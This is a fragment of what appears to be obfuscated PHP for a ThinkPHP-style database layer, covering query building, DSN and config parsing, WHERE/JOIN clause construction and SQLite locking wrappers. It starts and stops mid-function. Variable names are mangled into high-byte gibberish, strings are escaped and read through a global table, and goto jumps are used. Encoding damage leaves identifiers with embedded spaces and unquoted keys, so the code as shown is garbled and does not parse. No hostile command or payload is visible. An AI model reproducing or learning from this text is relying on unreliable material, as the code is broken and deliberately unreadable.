unset($˜‘Ş©ûî); $“¢»¶á = Model($µôüšî[2349]); foreach ($æøßÄÏÁ as &$Ü‚ûÓğ¥) { $„šŞä¼Ñ = array(); if (isset($ñÓÜßÜ½[$Ü‚ûÓğ¥[$µôüšî[1669]]])) { $„šŞä¼Ñ = $ñÓÜßÜ½[$Ü‚ûÓğ¥[$µôüšî[1669]]]; } $Ü‚ûÓğ¥[$µôüšî[2350]] = array(); if (isset($„šŞä¼Ñ[$ş»ìÜí])) { $Ü‚ûÓğ¥[$µôüšî[2350]] = $“¢»¶á->getUserJobInfo($„šŞä¼Ñ[$ş»ìÜí]); } } unset($Ü‚ûÓğ¥); } protected function groupUserAll($âÓ¼®) { $üîâÅæĞ =& $_SERVER[¹òÍ›æş]; if (!$âÓ¼®) { return !1; } $ÏÄ¸Œ· = Model($üîâÅæĞ[1949])->field($üîâÅæĞ[1669])->where(array($üîâÅæĞ[1859] => array($üîâÅæĞ[7], $âÓ¼®)))->select(); $ÏÄ¸Œ· = array_to_keyvalue($ÏÄ¸Œ·, $üîâÅæĞ[12], $üîâÅæĞ[1669]); return array_unique($ÏÄ¸Œ·); } public function userSearch($ùö†’á·, $ú˜·³ï¹ = "\x2a") { return Model($_SERVER[¹òÍ›æş][563])->where($ùö†’á·)->field($ú˜·³ï¹)->find(); } } goto dèê‡…İÌ„; E—¬½÷–‡: class DbSqlite extends DbSqliteBase { public function query($ò­Çùƒô) { $ôŸ®Í =& $_SERVER[¹òÍ›æş]; if (!CacheLock::fileLock($ôŸ®Í[13])) { return !1; } $ª—Ïİ–ó = parent::query($ò­Çùƒô); CacheLock::fileUnLock($ôŸ®Í[13]); return $ª—Ïİ–ó; } public function execute($ûÓœ¯ß») { $Ô³ñœ‚ =& $_SERVER[¹òÍ›æş]; if (!CacheLock::fileLock($Ô³ñœ‚[13])) { return !1; } $åôàæŸ = parent::execute($ûÓœ¯ß»); CacheLock::fileUnLock($Ô³ñœ‚[13]); return $åôàæŸ; } } class DbSqlite3 extends DbSqlite3Base { public function query($¢äşÚ´Ì) { $Ôœû‘ÏÃ =& $_SERVER[¹òÍ›æş]; if (!CacheLock::fileLock($Ôœû‘ÏÃ[13])) { return !1; } $öñ–ÖñÍ = parent::query($¢äşÚ´Ì); CacheLock::fileUnLock($Ôœû‘ÏÃ[13]); return $öñ–ÖñÍ; } public function execute($‘•îƒ©·) { $İ³¶…×Æ =& $_SERVER[¹òÍ›æş]; if (!CacheLock::fileLock($İ³¶…×Æ[13])) { return !1; } $Ì¶£È¸ = parent::execute($‘•îƒ©·); CacheLock::fileUnLock($İ³¶…×Æ[13]); return $Ì¶£È¸; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\145\161" => "\74\76", "\x67\x74" => "\76", "\145\147\x74" => "\x3e\75", "\154\x74" => "\74", "\145\154\164" => "\74\x3d", "\156\157\x74\x6c\x69\x6b\145" => "\116\x4f\124\x20\114\111\113\105", "\154\151\153\145" => "\114\x49\x4b\105", "\x69\156" => "\111\x4e", "\156\x6f\x74\151\156" => "\116\x4f\124\x20\x49\116", "\x6e\x6f\x74\x20\x69\156" => "\x4e\117\x54\40\x49\116", "\142\145\164\x77\x65\145\156" => "\x42\x45\x54\127\x45\x45\116", "\156\157\164\x62\x65\x74\167\x65\x65\156" => "\x4e\x4f\x54\40\x42\105\x54\x57\x45\105\x4e", "\156\x6f\164\40\x62\x65\164\167\x65\x65\156" => "\116\x4f\x54\x20\x42\105\x54\x57\105\105\x4e"); protected $selectSql = "\x53\x45\x4c\105\x43\124\45\104\111\x53\x54\x49\x4e\103\124\45\x20\x25\106\111\x45\114\x44\45\x20\x46\x52\117\115\40\x25\124\x41\x42\x4c\x45\45\x25\112\117\x49\116\45\x25\x57\110\105\122\105\45\45\x47\122\x4f\125\x50\x25\x25\x48\x41\126\111\x4e\x47\x25\45\117\122\x44\105\x52\x25\x25\x4c\x49\115\111\x54\x25\x20\45\x55\x4e\x49\117\116\45\x25\x43\x4f\115\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $Õ¬Éü×“ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¹òÍ›æş][987], $Õ¬Éü×“); } public function factory($ƒ³«Àèâ = '') { $ºµàÄÙõ =& $_SERVER[¹òÍ›æş]; $ƒ³«Àèâ = $this->parseConfig($ƒ³«Àèâ); if (empty($ƒ³«Àèâ[$ºµàÄÙõ[988]])) { think_exception(think_lang($ºµàÄÙõ[989])); } $this->dbType = ucwords(strtolower($ƒ³«Àèâ[$ºµàÄÙõ[988]])); $Öé Â¾” = $ºµàÄÙõ[990] . $this->dbType; if (class_exists($Öé Â¾”)) { $€”…Á‹ˆ = new $Öé Â¾”($ƒ³«Àèâ); if ($ºµàÄÙõ[991] != strtolower($ƒ³«Àèâ[$ºµàÄÙõ[988]])) { $€”…Á‹ˆ->dbType = strtoupper($this->dbType); } else { $€”…Á‹ˆ->dbType = $this->_getDsnType($ƒ³«Àèâ[$ºµàÄÙõ[943]]); } } else { think_exception(think_lang($ºµàÄÙõ[992]) . $ºµàÄÙõ[993] . $Öé Â¾”); } return $€”…Á‹ˆ; } public function __call($Óè¨´½ç, $ª£ä”ß¶) { if (method_exists($this, $Óè¨´½ç)) { return call_user_func_array(array($this, $Óè¨´½ç), $ª£ä”ß¶); } } protected function _getDsnType($˜Ë–šå) { $ëü£‡¶ = explode($_SERVER[¹òÍ›æş][4], $˜Ë–šå); $Ğâ×ÖÀò = strtoupper(trim($ëü£‡¶[0])); return $Ğâ×ÖÀò; } private function parseConfig($„Œ”Ç = '') { $Ä×ßøù› =& $_SERVER[¹òÍ›æş]; if (!empty($„Œ”Ç) && is_string($„Œ”Ç)) { $„Œ”Ç = $this->parseDSN($„Œ”Ç); } elseif (is_array($„Œ”Ç)) { $„Œ”Ç = array_change_key_case($„Œ”Ç); $„Œ”Ç = array($Ä×ßøù›[988] => $„Œ”Ç[$Ä×ßøù›[994]], $Ä×ßøù›[915] => $„Œ”Ç[$Ä×ßøù›[995]], $Ä×ßøù›[916] => $„Œ”Ç[$Ä×ßøù›[996]], $Ä×ßøù›[913] => $„Œ”Ç[$Ä×ßøù›[997]], $Ä×ßøù›[914] => $„Œ”Ç[$Ä×ßøù›[998]], $Ä×ßøù›[21] => $„Œ”Ç[$Ä×ßøù›[999]], $Ä×ßøù›[943] => $„Œ”Ç[$Ä×ßøù›[1000]], $Ä×ßøù›[17] => isset($„Œ”Ç[$Ä×ßøù›[1001]]) ? $„Œ”Ç[$Ä×ßøù›[1001]] : array()); } elseif (empty($„Œ”Ç)) { if (think_config($Ä×ßøù›[1002]) && $Ä×ßøù›[991] != strtolower(think_config($Ä×ßøù›[1003]))) { $„Œ”Ç = $this->parseDSN(think_config($Ä×ßøù›[1002])); } else { $„Œ”Ç = array($Ä×ßøù›[988] => think_config($Ä×ßøù›[1003]), $Ä×ßøù›[915] => think_config($Ä×ßøù›[1004]), $Ä×ßøù›[916] => think_config($Ä×ßøù›[1005]), $Ä×ßøù›[913] => think_config($Ä×ßøù›[1006]), $Ä×ßøù›[914] => think_config($Ä×ßøù›[1007]), $Ä×ßøù›[21] => think_config($Ä×ßøù›[284]), $Ä×ßøù›[943] => think_config($Ä×ßøù›[1002]), $Ä×ßøù›[17] => think_config($Ä×ßøù›[1008])); } } return $„Œ”Ç; } protected function initConnect($ÎÌâÉÁ = true) { if (1 == think_config($_SERVER[¹òÍ›æş][22])) { $this->_linkID = $this->multiConnect($ÎÌâÉÁ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¹Öëû” => $‚úõÃÎ) { $this->_linkID = $‚úõÃÎ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÓÅ·‰Ñ’ = false) { $ÆîˆÄò =& $_SERVER[¹òÍ›æş]; static $™ê÷Ïáì = array(); static $²¨™Ëûß = -1; if (empty($™ê÷Ïáì)) { foreach ($this->config as $‘Â¨“›‘ => $Ù‹Ï³Ë) { $™ê÷Ïáì[$‘Â¨“›‘] = explode($ÆîˆÄò[50], $Ù‹Ï³Ë); } } if (think_config($ÆîˆÄò[1009])) { if ($ÓÅ·‰Ñ’ || think_config($ÆîˆÄò[433]) === !0) { $Ò÷®÷ò = floor(mt_rand(0, think_config($ÆîˆÄò[1010]) - 1)); $²¨™Ëûß = $Ò÷®÷ò; } else { if (is_numeric(think_config($ÆîˆÄò[1011]))) { $Ò÷®÷ò = think_config($ÆîˆÄò[1011]); } else { $Ò÷®÷ò = floor(mt_rand(think_config($ÆîˆÄò[1010]), count($™ê÷Ïáì[$ÆîˆÄò[913]]) - 1)); } } } else { $Ò÷®÷ò = floor(mt_rand(0, count($™ê÷Ïáì[$ÆîˆÄò[913]]) - 1)); $²¨™Ëûß = $Ò÷®÷ò; } $Ò÷®÷ò = $²¨™Ëûß !== -1 ? $²¨™Ëûß : $Ò÷®÷ò; $­ÌÌğ÷‡ = array($ÆîˆÄò[915] => isset($™ê÷Ïáì[$ÆîˆÄò[915]][$Ò÷®÷ò]) ? $™ê÷Ïáì[$ÆîˆÄò[915]][$Ò÷®÷ò] : $™ê÷Ïáì[$ÆîˆÄò[915]][0], $ÆîˆÄò[916] => isset($™ê÷Ïáì[$ÆîˆÄò[916]][$Ò÷®÷ò]) ? $™ê÷Ïáì[$ÆîˆÄò[916]][$Ò÷®÷ò] : $™ê÷Ïáì[$ÆîˆÄò[916]][0], $ÆîˆÄò[913] => isset($™ê÷Ïáì[$ÆîˆÄò[913]][$Ò÷®÷ò]) ? $™ê÷Ïáì[$ÆîˆÄò[913]][$Ò÷®÷ò] : $™ê÷Ïáì[$ÆîˆÄò[913]][0], $ÆîˆÄò[914] => isset($™ê÷Ïáì[$ÆîˆÄò[914]][$Ò÷®÷ò]) ? $™ê÷Ïáì[$ÆîˆÄò[914]][$Ò÷®÷ò] : $™ê÷Ïáì[$ÆîˆÄò[914]][0], $ÆîˆÄò[21] => isset($™ê÷Ïáì[$ÆîˆÄò[21]][$Ò÷®÷ò]) ? $™ê÷Ïáì[$ÆîˆÄò[21]][$Ò÷®÷ò] : $™ê÷Ïáì[$ÆîˆÄò[21]][0], $ÆîˆÄò[943] => isset($™ê÷Ïáì[$ÆîˆÄò[943]][$Ò÷®÷ò]) ? $™ê÷Ïáì[$ÆîˆÄò[943]][$Ò÷®÷ò] : $™ê÷Ïáì[$ÆîˆÄò[943]][0], $ÆîˆÄò[17] => isset($™ê÷Ïáì[$ÆîˆÄò[17]][$Ò÷®÷ò]) ? $™ê÷Ïáì[$ÆîˆÄò[17]][$Ò÷®÷ò] : $™ê÷Ïáì[$ÆîˆÄò[17]][0]); return $this->connect($­ÌÌğ÷‡, $Ò÷®÷ò); } public function parseDSN($ÙıÕÇ) { $áîÒòê™ =& $_SERVER[¹òÍ›æş]; if (empty($ÙıÕÇ)) { return !1; } $³èó»­ë = parse_url($ÙıÕÇ); if ($³èó»­ë[$áîÒòê™[191]]) { $† àêĞ = array($áîÒòê™[988] => $³èó»­ë[$áîÒòê™[191]], $áîÒòê™[915] => isset($³èó»­ë[$áîÒòê™[628]]) ? $³èó»­ë[$áîÒòê™[628]] : $áîÒòê™[12], $áîÒòê™[916] => isset($³èó»­ë[$áîÒòê™[1012]]) ? $³èó»­ë[$áîÒòê™[1012]] : $áîÒòê™[12], $áîÒòê™[913] => isset($³èó»­ë[$áîÒòê™[192]]) ? $³èó»­ë[$áîÒòê™[192]] : $áîÒòê™[12], $áîÒòê™[914] => isset($³èó»­ë[$áîÒòê™[193]]) ? $³èó»­ë[$áîÒòê™[193]] : $áîÒòê™[12], $áîÒòê™[21] => isset($³èó»­ë[$áîÒòê™[94]]) ? substr($³èó»­ë[$áîÒòê™[94]], 1) : $áîÒòê™[12]); } else { preg_match($áîÒòê™[1013], trim($ÙıÕÇ), $‘×“²ã); $† àêĞ = array($áîÒòê™[988] => $‘×“²ã[1], $áîÒòê™[915] => $‘×“²ã[2], $áîÒòê™[916] => $‘×“²ã[3], $áîÒòê™[913] => $‘×“²ã[4], $áîÒòê™[914] => $‘×“²ã[5], $áîÒòê™[21] => $‘×“²ã[6]); } $† àêĞ[$áîÒòê™[943]] = $áîÒòê™[12]; return $† àêĞ; } protected function debug() { $ş–Æ¥Ø× =& $_SERVER[¹òÍ›æş]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ş–Æ¥Ø×[1014]; if (think_config($ş–Æ¥Ø×[1015])) { think_status($ş–Æ¥Ø×[1016]); think_trace($this->queryStr . $ş–Æ¥Ø×[1017] . think_status($ş–Æ¥Ø×[24], $ş–Æ¥Ø×[1016], 6) . $ş–Æ¥Ø×[1018], $ş–Æ¥Ø×[12], $ş–Æ¥Ø×[1019]); } } protected function parseLock($—Ó«É£ = false) { $Ìø½×Œë =& $_SERVER[¹òÍ›æş]; if (!$—Ó«É£) { return $Ìø½×Œë[12]; } if ($Ìø½×Œë[945] == $this->dbType) { return $Ìø½×Œë[1020]; } return $Ìø½×Œë[1021]; } protected function parseSet($Ë—ÊÂ²) { $„‡ö³Ö =& $_SERVER[¹òÍ›æş]; foreach ($Ë—ÊÂ² as $æ¡ªÄªç => $¨ÓŞ´ÀÙ) { if (is_array($¨ÓŞ´ÀÙ) && $„‡ö³Ö[335] == $¨ÓŞ´ÀÙ[0]) { $ûš‰•“·[] = $this->parseKey($æ¡ªÄªç) . $„‡ö³Ö[911] . $¨ÓŞ´ÀÙ[1]; } elseif (is_scalar($¨ÓŞ´ÀÙ) || is_null($¨ÓŞ´ÀÙ)) { $ûš‰•“·[] = $this->parseKey($æ¡ªÄªç) . $„‡ö³Ö[911] . $this->parseValue($¨ÓŞ´ÀÙ); } } return $„‡ö³Ö[1022] . implode($„‡ö³Ö[50], $ûš‰•“·); } protected function bindParam($á…®éÏ«, $ÇéÖÎî‹) { $this->bind[$_SERVER[¹òÍ›æş][4] . $á…®éÏ«] = $ÇéÖÎî‹; } protected function parseBind($Ï›Œ…•ã) { $Ï›Œ…•ã = array_merge($this->bind, $Ï›Œ…•ã); $this->bind = array(); return $Ï›Œ…•ã; } function parseKey(&$ÅÌŠìÉ¬, $õêïõ¡ª = true) { if ($õêïõ¡ª) { $ÅÌŠìÉ¬ = $this->parseKeyCheck($ÅÌŠìÉ¬); } return $ÅÌŠìÉ¬; } function parseKeyCheck($úÁ€ì‹†) { $ƒïşŞÆˆ =& $_SERVER[¹òÍ›æş]; $úÁ€ì‹† = trim($úÁ€ì‹†); if (!preg_match($ƒïşŞÆˆ[1023], $úÁ€ì‹†)) { think_exception($ƒïşŞÆˆ[1024] . $úÁ€ì‹†); } return $úÁ€ì‹†; } protected function parseValue($˜¸§ùÌ²) { $¸ÕêÚ“Ö =& $_SERVER[¹òÍ›æş]; if (is_string($˜¸§ùÌ²)) { $˜¸§ùÌ² = $¸ÕêÚ“Ö[984] . $this->escapeString($˜¸§ùÌ²) . $¸ÕêÚ“Ö[984]; } elseif (isset($˜¸§ùÌ²[0]) && is_string($˜¸§ùÌ²[0]) && strtolower($˜¸§ùÌ²[0]) == $¸ÕêÚ“Ö[335]) { $˜¸§ùÌ² = $this->escapeString($˜¸§ùÌ²[1]); } elseif (is_array($˜¸§ùÌ²)) { $˜¸§ùÌ² = array_map(array($this, $¸ÕêÚ“Ö[985]), $˜¸§ùÌ²); } elseif (is_bool($˜¸§ùÌ²)) { $˜¸§ùÌ² = $˜¸§ùÌ² ? $¸ÕêÚ“Ö[98] : $¸ÕêÚ“Ö[208]; } elseif (is_null($˜¸§ùÌ²)) { $˜¸§ùÌ² = $¸ÕêÚ“Ö[113]; } return $˜¸§ùÌ²; } protected function parseField($ÁÑ¤ª¨§) { $¹üºÊ¸ô =& $_SERVER[¹òÍ›æş]; if (is_string($ÁÑ¤ª¨§) && strpos($ÁÑ¤ª¨§, $¹üºÊ¸ô[50])) { $ÁÑ¤ª¨§ = explode($¹üºÊ¸ô[50], $ÁÑ¤ª¨§); } if (is_array($ÁÑ¤ª¨§)) { $‚»×ò¡ = array(); foreach ($ÁÑ¤ª¨§ as $óËâã‹ => $«ÊĞÃÛ†) { if (!is_numeric($óËâã‹)) { $‚»×ò¡[] = $this->parseKey($óËâã‹, !1) . $¹üºÊ¸ô[1025] . $this->parseKey($«ÊĞÃÛ†); } else { $‚»×ò¡[] = $this->parseKey($«ÊĞÃÛ†); } } $¶˜úç§ì = implode($¹üºÊ¸ô[50], $‚»×ò¡); } elseif (is_string($ÁÑ¤ª¨§) && !empty($ÁÑ¤ª¨§)) { $¶˜úç§ì = $ÁÑ¤ª¨§; } else { $¶˜úç§ì = $¹üºÊ¸ô[199]; } return $¶˜úç§ì; } protected function parseTable($ù“•ÌÜ) { $‚—èÓ§ =& $_SERVER[¹òÍ›æş]; if (is_array($ù“•ÌÜ)) { $†…••ù = array(); foreach ($ù“•ÌÜ as $÷ÖÉ–éå => $ı¾ò¬¸) { if (!is_numeric($÷ÖÉ–éå)) { $†…••ù[] = $this->parseKey($÷ÖÉ–éå) . $‚—èÓ§[53] . $this->parseKey($ı¾ò¬¸); } else { $†…••ù[] = $this->parseKey($÷ÖÉ–éå); } } $ù“•ÌÜ = $†…••ù; } elseif (is_string($ù“•ÌÜ)) { if (strstr($ù“•ÌÜ, $‚—èÓ§[53])) { return $ù“•ÌÜ; } $ù“•ÌÜ = explode($‚—èÓ§[50], $ù“•ÌÜ); array_walk($ù“•ÌÜ, array($this, $‚—èÓ§[933])); } return $‚—èÓ§[927] . trim(implode($‚—èÓ§[1026], $ù“•ÌÜ), $‚—èÓ§[423]) . $‚—èÓ§[927]; } protected function parseWhere($¢ëÇ°ï®) { $ÉÃªïÈ =& $_SERVER[¹òÍ›æş]; $˜Ñ³Ç÷È = $ÉÃªïÈ[12]; if (is_string($¢ëÇ°ï®)) { $˜Ñ³Ç÷È = $¢ëÇ°ï®; } else { $Š®¿œ¹£ = isset($¢ëÇ°ï®[$ÉÃªïÈ[1027]]) ? strtoupper($¢ëÇ°ï®[$ÉÃªïÈ[1027]]) : $ÉÃªïÈ[12]; if (in_array($Š®¿œ¹£, array($ÉÃªïÈ[1028], $ÉÃªïÈ[1029], $ÉÃªïÈ[1030]))) { $Š®¿œ¹£ = $ÉÃªïÈ[53] . $Š®¿œ¹£ . $ÉÃªïÈ[53]; unset($¢ëÇ°ï®[$ÉÃªïÈ[1027]]); } else { $Š®¿œ¹£ = $ÉÃªïÈ[1031]; } foreach ($¢ëÇ°ï® as $Î–È§³á => $°êš«ª•) { $˜Ñ³Ç÷È .= $ÉÃªïÈ[315]; if (is_numeric($Î–È§³á)) { $Î–È§³á = $ÉÃªïÈ[1032]; } if (0 === strpos($Î–È§³á, $ÉÃªïÈ[11])) { $˜Ñ³Ç÷È .= $this->parseThinkWhere($Î–È§³á, $°êš«ª•); } else { if (!preg_match($ÉÃªïÈ[1033], trim($Î–È§³á))) { think_exception(think_lang($ÉÃªïÈ[1034]) . $ÉÃªïÈ[4] . $Î–È§³á); } $æö¢ŠÅé = is_array($°êš«ª•) && isset($°êš«ª•[$ÉÃªïÈ[1035]]); $Î–È§³á = trim($Î–È§³á); if (strpos($Î–È§³á, $ÉÃªïÈ[321])) { $†¬½şô¢ = explode($ÉÃªïÈ[321], $Î–È§³á); $ÃÆ¶ÂÍ¾ = array(); foreach ($†¬½şô¢ as $ÛçÕ†³ => $¾îú¢Ú¢) { $ö¶à˜·† = $æö¢ŠÅé ? $°êš«ª•[$ÛçÕ†³] : $°êš«ª•; $ÃÆ¶ÂÍ¾[] = $ÉÃªïÈ[298] . $this->parseWhereItem($this->parseKey($¾îú¢Ú¢), $ö¶à˜·†) . $ÉÃªïÈ[932]; } $˜Ñ³Ç÷È .= implode($ÉÃªïÈ[1036], $ÃÆ¶ÂÍ¾); } elseif (strpos($Î–È§³á, $ÉÃªïÈ[322])) { $†¬½şô¢ = explode($ÉÃªïÈ[322], $Î–È§³á); $ÃÆ¶ÂÍ¾ = array(); foreach ($†¬½şô¢ as $ÛçÕ†³ => $¾îú¢Ú¢) { $ö¶à˜·† = $æö¢ŠÅé ? $°êš«ª•[$ÛçÕ†³] : $°êš«ª•; $ÃÆ¶ÂÍ¾[] = $ÉÃªïÈ[298] . $this->parseWhereItem($this->parseKey($¾îú¢Ú¢), $ö¶à˜·†) . $ÉÃªïÈ[932]; } $˜Ñ³Ç÷È .= implode($ÉÃªïÈ[1031], $ÃÆ¶ÂÍ¾); } else { $˜Ñ³Ç÷È .= $this->parseWhereItem($this->parseKey($Î–È§³á), $°êš«ª•); } } $˜Ñ³Ç÷È .= $ÉÃªïÈ[316] . $Š®¿œ¹£; } $˜Ñ³Ç÷È = substr($˜Ñ³Ç÷È, 0, -strlen($Š®¿œ¹£)); } return empty($˜Ñ³Ç÷È) ? $ÉÃªïÈ[12] : $ÉÃªïÈ[1037] . $˜Ñ³Ç÷È; } protected function parseWhereItem($¯ßŸŞúë, $ñ Ôøê÷) { $·û­†ñ† =& $_SERVER[¹òÍ›æş]; $Ç¿“ú‹å = $·û­†ñ†[12]; if (is_array($ñ Ôøê÷)) { if (is_string($ñ Ôøê÷[0])) { $ÁäË¤› = strtolower($ñ Ôøê÷[0]); if (in_array($ñ Ôøê÷[0], array($·û­†ñ†[911], $·û­†ñ†[1038], $·û­†ñ†[1039], $·û­†ñ†[1040], $·û­†ñ†[1041], $·û­†ñ†[1042]))) { $Ç¿“ú‹å .= $¯ßŸŞúë . $·û­†ñ†[53] . $ñ Ôøê÷[0] . $·û­†ñ†[53] . $this->parseValue($ñ Ôøê÷[1]); } elseif (preg_match($·û­†ñ†[1043], $ñ Ôøê÷[0])) { $Ç¿“ú‹å .= $¯ßŸŞúë . $·û­†ñ†[53] . $this->exp[$ÁäË¤›] . $·û­†ñ†[53] . $this->parseValue($ñ Ôøê÷[1]); } elseif (preg_match($·û­†ñ†[1044], $ñ Ôøê÷[0])) { if (is_array($ñ Ôøê÷[1])) { $ï¯›íÑı = isset($ñ Ôøê÷[2]) ? strtoupper($ñ Ôøê÷[2]) : $·û­†ñ†[1029]; if (in_array($ï¯›íÑı, array($·û­†ñ†[1028], $·û­†ñ†[1029], $·û­†ñ†[1030]))) { $½‚©‰û = array(); foreach ($ñ Ôøê÷[1] as $–×»Äš) { $½‚©‰û[] = $¯ßŸŞúë . $·û­†ñ†[53] . $this->exp[$ÁäË¤›] . $·û­†ñ†[53] . $this->parseValue($–×»Äš); } $Ç¿“ú‹å .= $·û­†ñ†[298] . implode($·û­†ñ†[53] . $ï¯›íÑı . $·û­†ñ†[53], $½‚©‰û) . $·û­†ñ†[932]; } } else { $Ç¿“ú‹å .= $¯ßŸŞúë . $·û­†ñ†[53] . $this->exp[$ÁäË¤›] . $·û­†ñ†[53] . $this->parseValue($ñ Ôøê÷[1]); } } elseif ($·û­†ñ†[335] == $ÁäË¤›) { $Ç¿“ú‹å .= $·û­†ñ†[930] . $¯ßŸŞúë . $·û­†ñ†[53] . $ñ Ôøê÷[1] . $·û­†ñ†[1045]; } elseif (preg_match($·û­†ñ†[1046], $ñ Ôøê÷[0])) { $Ç¿“ú‹å .= $ñ Ôøê÷[0]; } elseif (preg_match($·û­†ñ†[1047], $ñ Ôøê÷[0])) { if (isset($ñ Ôøê÷[2]) && $·û­†ñ†[335] == $ñ Ôøê÷[2]) { $Ç¿“ú‹å .= $¯ßŸŞúë . $·û­†ñ†[53] . $this->exp[$ÁäË¤›] . $·û­†ñ†[53] . $ñ Ôøê÷[1]; } else { if (is_string($ñ Ôøê÷[1])) { $ñ Ôøê÷[1] = explode($·û­†ñ†[50], $ñ Ôøê÷[1]); } $ÂàõŸï = implode($·û­†ñ†[50], $this->parseValue($ñ Ôøê÷[1])); $Ç¿“ú‹å .= $¯ßŸŞúë . $·û­†ñ†[53] . $this->exp[$ÁäË¤›] . $·û­†ñ†[930] . $ÂàõŸï . $·û­†ñ†[932]; } } elseif (preg_match($·û­†ñ†[1048], $ñ Ôøê÷[0])) { $Š Å“×Ü = is_string($ñ Ôøê÷[1]) ? explode($·û­†ñ†[50], $ñ Ôøê÷[1]) : $ñ Ôøê÷[1]; $Ç¿“ú‹å .= $·û­†ñ†[930] . $¯ßŸŞúë . $·û­†ñ†[53] . $this->exp[$ÁäË¤›] . $·û­†ñ†[53] . $this->parseValue($Š Å“×Ü[0]) . $·û­†ñ†[1031] . $this->parseValue($Š Å“×Ü[1]) . $·û­†ñ†[316]; } else { think_exception(think_lang($·û­†ñ†[1034]) . $·û­†ñ†[4] . $ñ Ôøê÷[0]); } } else { $½­Ä•³× = count($ñ Ôøê÷); $›ü´Ë« = $·û­†ñ†[12]; if (is_string($ñ Ôøê÷[$½­Ä•³× - 1])) { $›ü´Ë« = isset($ñ Ôøê÷[$½­Ä•³× - 1]) ? strtoupper($ñ Ôøê÷[$½­Ä•³× - 1]) : $·û­†ñ†[12]; if (in_array($›ü´Ë«, array($·û­†ñ†[1028], $·û­†ñ†[1029], $·û­†ñ†[1030]))) { $½­Ä•³× = $½­Ä•³× - 1; } } else { $›ü´Ë« = $·û­†ñ†[1028]; } for ($çšÜ§ÅÀ = 0; $çšÜ§ÅÀ < $½­Ä•³×; $çšÜ§ÅÀ++) { $Š Å“×Ü = is_array($ñ Ôøê÷[$çšÜ§ÅÀ]) ? $ñ Ôøê÷[$çšÜ§ÅÀ][1] : $ñ Ôøê÷[$çšÜ§ÅÀ]; if ($·û­†ñ†[335] == strtolower($ñ Ôøê÷[$çšÜ§ÅÀ][0])) { $Ç¿“ú‹å .= $·û­†ñ†[298] . $¯ßŸŞúë . $·û­†ñ†[53] . $Š Å“×Ü . $·û­†ñ†[1045] . $›ü´Ë« . $·û­†ñ†[53]; } else { $³ñæü§Î = is_array($ñ Ôøê÷[$çšÜ§ÅÀ]) ? $this->exp[strtolower($ñ Ôøê÷[$çšÜ§ÅÀ][0])] : $·û­†ñ†[911]; if (!$³ñæü§Î && is_array($ñ Ôøê÷[$çšÜ§ÅÀ]) && in_array($ñ Ôøê÷[$çšÜ§ÅÀ][0], array($·û­†ñ†[911], $·û­†ñ†[1038], $·û­†ñ†[1039], $·û­†ñ†[1040], $·û­†ñ†[1041], $·û­†ñ†[1042]))) { $³ñæü§Î = $ñ Ôøê÷[$çšÜ§ÅÀ][0]; } $Ç¿“ú‹å .= $·û­†ñ†[298] . $¯ßŸŞúë . $·û­†ñ†[53] . $³ñæü§Î . $·û­†ñ†[53] . $this->parseValue($Š Å“×Ü) . $·û­†ñ†[1045] . $›ü´Ë« . $·û­†ñ†[53]; } } $Ç¿“ú‹å = substr($Ç¿“ú‹å, 0, -4); } } else { $Ç¿“ú‹å .= $¯ßŸŞúë . $·û­†ñ†[1049] . $this->parseValue($ñ Ôøê÷); } return $Ç¿“ú‹å; } protected function parseThinkWhere($ÒİÏÛÕ, $›§µ”Ë˜) { $§¥Ùì« =& $_SERVER[¹òÍ›æş]; $å•¾æú» = $§¥Ùì«[12]; switch ($ÒİÏÛÕ) { case $§¥Ùì«[390]: $å•¾æú» = $›§µ”Ë˜; break; case $§¥Ùì«[1032]: $å•¾æú» = is_string($›§µ”Ë˜) ? $›§µ”Ë˜ : substr($this->parseWhere($›§µ”Ë˜), 6); break; case $§¥Ùì«[1050]: parse_str($›§µ”Ë˜, $ü›×’ª); if (isset($ü›×’ª[$§¥Ùì«[1027]])) { $ø¶Ã¬ = $§¥Ùì«[53] . strtoupper($ü›×’ª[$§¥Ùì«[1027]]) . $§¥Ùì«[53]; unset($ü›×’ª[$§¥Ùì«[1027]]); } else { $ø¶Ã¬ = $§¥Ùì«[1031]; } $šÕ¨“ï = array(); foreach ($ü›×’ª as $½Îßù¤ğ => $÷òÊ²©ô) { $šÕ¨“ï[] = $this->parseKey($½Îßù¤ğ) . $§¥Ùì«[1049] . $this->parseValue($÷òÊ²©ô); } $å•¾æú» = implode($ø¶Ã¬, $šÕ¨“ï); break; } return $å•¾æú»; } protected function parseLimit($Ï«Ä£õ‡) { $Îø±çˆë =& $_SERVER[¹òÍ›æş]; return !empty($Ï«Ä£õ‡) ? $Îø±çˆë[51] . $Ï«Ä£õ‡ . $Îø±çˆë[53] : $Îø±çˆë[12]; } protected function parseJoin($ı‚ö§ì­) { $ĞÒš“«« =& $_SERVER[¹òÍ›æş]; $¿¿­á›‚ = $ĞÒš“««[12]; if (!empty($ı‚ö§ì­)) { if (is_array($ı‚ö§ì­)) { foreach ($ı‚ö§ì­ as $éÂ†Ñ¹î => $äÔôªİ¤) { if (!1 !== stripos($äÔôªİ¤, $ĞÒš“««[1051])) { $¿¿­á›‚ .= $ĞÒš“««[53] . $äÔôªİ¤; } else { $¿¿­á›‚ .= $ĞÒš“««[1052] . $äÔôªİ¤; } } } else { $¿¿­á›‚ .= $ĞÒš“««[1052] . $ı‚ö§ì­; } } $¿¿­á›‚ = preg_replace($ĞÒš“««[1053], think_config($ĞÒš“««[957]) . $ĞÒš“««[1054], $¿¿­á›‚); return $¿¿­á›‚; } protected function parseOrder($ˆ¿éşİ) { $“Ó´¾Š =& $_SERVER[¹òÍ›æş]; if (is_array($ˆ¿éşİ)) { $œÎş»ìÊ = array(); foreach ($ˆ¿éşİ as $Ñƒ¥¯…† => $†™ĞğÑ—) { if 